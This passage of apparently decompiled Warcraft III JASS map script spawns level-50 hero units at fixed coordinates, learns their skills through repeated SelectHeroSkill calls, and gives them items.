call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304144)
call SelectHeroSkill(Hu,$41304144)
call SelectHeroSkill(Hu,$41304144)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call SelectHeroSkill(Hu,$41304C54)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305744,0)
set Hu=CreateUnit(Ht,$4830364A,-15762.7,14551.,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41305951)
call SelectHeroSkill(Hu,$41305951)
call SelectHeroSkill(Hu,$41305951)
call SelectHeroSkill(Hu,$41305951)
call SelectHeroSkill(Hu,$41305951)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call SelectHeroSkill(Hu,$41305939)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call SelectHeroSkill(Hu,$41305946)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call SelectHeroSkill(Hu,$4130595A)
call IssueImmediateOrder(Hu,"innerfireoff")
call SelectHeroSkill(Hu,$4130594A)
call SelectHeroSkill(Hu,$4130594A)
call SelectHeroSkill(Hu,$4130594A)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305739,0)
set Hu=CreateUnit(Ht,$4830364B,-15602.3,14550.1,270.)
call SetHeroLevel(Hu,50,false)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call SelectHeroSkill(Hu,$41313942)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call SelectHeroSkill(Hu,$41303832)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call SelectHeroSkill(Hu,$53303036)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303833)
call SelectHeroSkill(Hu,$41303833)
call SelectHeroSkill(Hu,$41303833)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304354)
call SelectHeroSkill(Hu,$41304354)
call SelectHeroSkill(Hu,$41304354)
call SelectHeroSkill(Hu,$41304354)
call SelectHeroSkill(Hu,$41304354)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305749,0)
set KW=CreateUnit(Ht,$6E62656C,-14890.5,-1455.8,120.924)
call SetUnitState(KW,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$48303743,-15763.2,14339.2,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41314353)
call SelectHeroSkill(Hu,$41314353)
call SelectHeroSkill(Hu,$41314353)
call SelectHeroSkill(Hu,$41314353)
call SelectHeroSkill(Hu,$41314353)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call SelectHeroSkill(Hu,$41314354)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call SelectHeroSkill(Hu,$41314241)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call SelectHeroSkill(Hu,$41314242)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41314352)
call SelectHeroSkill(Hu,$41314352)
call SelectHeroSkill(Hu,$41314352)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305A50,0)
set Hu=CreateUnit(Ht,$6E766C32,5120.7,2465.5,160.469)
set Hu=CreateUnit(Ht,$4F30304D,-15617.8,14344.,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$5330304C)
call SelectHeroSkill(Hu,$5330304C)
call SelectHeroSkill(Hu,$5330304C)
call SelectHeroSkill(Hu,$5330304C)
call SelectHeroSkill(Hu,$5330304C)
call IssueImmediateOrder(Hu,"")
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call SelectHeroSkill(Hu,$41304153)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call SelectHeroSkill(Hu,$4130385A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130584C)
call SelectHeroSkill(Hu,$4130584C)
call SelectHeroSkill(Hu,$4130584C)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call SelectHeroSkill(Hu,$41313132)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305746,0)
set Hu=CreateUnit(Ht,$6E766C32,5047.2,2347.8,87.56)
set Hu=CreateUnit(Ht,$4F30304E,-16178.7,14366.3,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41313239)
call SelectHeroSkill(Hu,$41313239)
call SelectHeroSkill(Hu,$41313239)
call SelectHeroSkill(Hu,$41313239)
call SelectHeroSkill(Hu,$41313239)
call IssueImmediateOrder(Hu,"")
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call SelectHeroSkill(Hu,$41313238)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call SelectHeroSkill(Hu,$41303859)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304435)
call SelectHeroSkill(Hu,$41304435)
call SelectHeroSkill(Hu,$41304435)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call SelectHeroSkill(Hu,$41313056)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305738,0)
set Hu=CreateUnit(Ht,$4F30304F,-15471.8,14545.5,270.)
call SetHeroLevel(Hu,50,false)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
call SelectHeroSkill(Hu,$41304258)
call SelectHeroSkill(Hu,$41304258)
call SelectHeroSkill(Hu,$41304258)
call SelectHeroSkill(Hu,$41304258)
call SelectHeroSkill(Hu,$41304258)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call SelectHeroSkill(Hu,$4130574C)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call SelectHeroSkill(Hu,$41304344)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call SelectHeroSkill(Hu,$41304253)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304338)
call SelectHeroSkill(Hu,$41304338)
call SelectHeroSkill(Hu,$41304338)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call SelectHeroSkill(Hu,$41305458)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305736,0)
set KX=CreateUnit(Ht,$4867616D,7756.2,1162.,220.455)
call SetUnitState(KX,UNIT_STATE_MANA,57)
set Hu=CreateUnit(Ht,$55303132,-15326.9,14518.5,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41313244)
call SelectHeroSkill(Hu,$41313244)
call SelectHeroSkill(Hu,$41313244)
call SelectHeroSkill(Hu,$41313244)
call SelectHeroSkill(Hu,$41313244)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call SelectHeroSkill(Hu,$41304E56)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call SelectHeroSkill(Hu,$4130435A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call SelectHeroSkill(Hu,$41314434)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304359)
call SelectHeroSkill(Hu,$41304359)
call SelectHeroSkill(Hu,$41304359)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$4930574F,0)
set Hu=CreateUnit(Ht,$45303131,-15339.6,14318.7,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call SelectHeroSkill(Hu,$41303849)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call SelectHeroSkill(Hu,$41313956)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call SelectHeroSkill(Hu,$41303852)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313137)
call SelectHeroSkill(Hu,$41313137)
call SelectHeroSkill(Hu,$41313137)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304257)
call SelectHeroSkill(Hu,$41304257)
call SelectHeroSkill(Hu,$41304257)
call SelectHeroSkill(Hu,$41304257)
call SelectHeroSkill(Hu,$41304257)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305735,0)
set Hu=CreateUnit(Ht,$4830364C,-15217.,14313.9,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$4130544C)
call SelectHeroSkill(Hu,$4130544C)
call SelectHeroSkill(Hu,$4130544C)
call SelectHeroSkill(Hu,$4130544C)
call SelectHeroSkill(Hu,$4130544C)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call SelectHeroSkill(Hu,$41305448)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call SelectHeroSkill(Hu,$41305449)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call SelectHeroSkill(Hu,$4130544A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130544B)
call SelectHeroSkill(Hu,$4130544B)
call SelectHeroSkill(Hu,$4130544B)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$4930574E,0)
set Hu=CreateUnit(Ht,$4F303050,-15213.5,14498.,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41303053)
call SelectHeroSkill(Hu,$41303053)
call SelectHeroSkill(Hu,$41303053)
call SelectHeroSkill(Hu,$41303053)
call SelectHeroSkill(Hu,$41303053)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call SelectHeroSkill(Hu,$41303049)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call SelectHeroSkill(Hu,$41303052)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call SelectHeroSkill(Hu,$41304459)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130344F)
call SelectHeroSkill(Hu,$4130344F)
call SelectHeroSkill(Hu,$4130344F)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call SelectHeroSkill(Hu,$41303457)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$4930574B,0)
set Hu=CreateUnit(Ht,$4F303045,6716.1,1152.2,272.37)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$68706561,5454.9,-1642.1,41.52)
set KY=CreateUnit(Ht,$68706561,5553.4,-1369.3,280.962)
set KZ=CreateUnit(Ht,$6E686561,5833.6,1345.7,212.218)
set Hu=CreateUnit(Ht,$68726468,7948.4,1183.4,8.355)
set Hu=CreateUnit(Ht,$68726468,7920.2,1002.6,7.648)
set Hu=CreateUnit(Ht,$68726468,7923.9,798.3,5.72)
set Ka=CreateUnit(Ht,$6E30384C,5643.8,49.8,118.68)
set Hu=CreateUnit(Ht,$4830364D,-15074.2,14309.3,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41304D53)
call SelectHeroSkill(Hu,$41304D53)
call SelectHeroSkill(Hu,$41304D53)
call SelectHeroSkill(Hu,$41304D53)
call SelectHeroSkill(Hu,$41304D53)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call SelectHeroSkill(Hu,$41303954)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call SelectHeroSkill(Hu,$41304D50)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call SelectHeroSkill(Hu,$41304D51)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303042)
call SelectHeroSkill(Hu,$41303042)
call SelectHeroSkill(Hu,$41303042)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305745,0)
set Hu=CreateUnit(Ht,$6E766C32,7077.7,-1748.6,87.56)
set Hu=CreateUnit(Ht,$6E656372,7029.8,1170.2,240.33)
set Hu=CreateUnit(Ht,$6E656372,7398.,1330.3,289.81)
set Hu=CreateUnit(Ht,$6E736865,7062.7,1275.3,105.32)
set Hu=CreateUnit(Ht,$6E736865,7293.5,1248.,107.07)
set Hu=CreateUnit(Ht,$6E656368,7181.3,1271.6,80.3)
set Hu=CreateUnit(Ht,$6E656368,7393.7,1174.4,333.71)
set Kb=CreateUnit(Ht,$4864676F,5548.8,-2220.2,41.453)
call SetUnitState(Kb,UNIT_STATE_MANA,0)
set Kc=CreateUnit(Ht,$486C6772,5457.7,-1999.6,355.651)
call SetUnitState(Kc,UNIT_STATE_MANA,0)
set Kd=CreateUnit(Ht,$6E6B6F6C,7981.3,-198.2,245.79)
set Hu=CreateUnit(Ht,$6E686566,-15064.8,2388.2,342.217)
set Ke=CreateUnit(Ht,$6E636731,-4105.6,12649.,154.128)
set Hu=CreateUnit(Ht,$4F30304C,-15496.5,14085.,270.)
call SetHeroLevel(Hu,50,false)
call UnitAddItemToSlotById(Hu,$6D6C7374,0)
set Hu=CreateUnit(Ht,$45303132,-15067.3,14492.8,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$4130304E)
call SelectHeroSkill(Hu,$4130304E)
call SelectHeroSkill(Hu,$4130304E)
call SelectHeroSkill(Hu,$4130304E)
call SelectHeroSkill(Hu,$4130304E)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call SelectHeroSkill(Hu,$41303039)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call SelectHeroSkill(Hu,$41305830)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call SelectHeroSkill(Hu,$41305233)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305A54)
call SelectHeroSkill(Hu,$41305A54)
call SelectHeroSkill(Hu,$41305A54)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$4930574C,0)
set Kf=CreateUnit(Ht,$48303635,-15623.,13554.4,270.)
call SetHeroLevel(Kf,50,false)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call SelectHeroSkill(Kf,$41305037)
call IssueImmediateOrder(Kf,"")
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call SelectHeroSkill(Kf,$41305048)
call IssueImmediateOrder(Kf,"")
call SelectHeroSkill(Kf,$41305047)
call SelectHeroSkill(Kf,$41305047)
call SelectHeroSkill(Kf,$41305047)
call IssueImmediateOrder(Kf,"")
call SelectHeroSkill(Kf,$41305339)
call SelectHeroSkill(Kf,$41305339)
call SelectHeroSkill(Kf,$41305339)
call SelectHeroSkill(Kf,$41305339)
call SelectHeroSkill(Kf,$41305339)
call IssueImmediateOrder(Kf,"")
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call SelectHeroSkill(Kf,$4130505A)
call IssueImmediateOrder(Kf,"")
set Kg=CreateUnit(Ht,$6E73676E,-4954.1,13173.3,306.063)
set Kh=CreateUnit(Ht,$6E686566,-14943.6,2301.1,163.756)
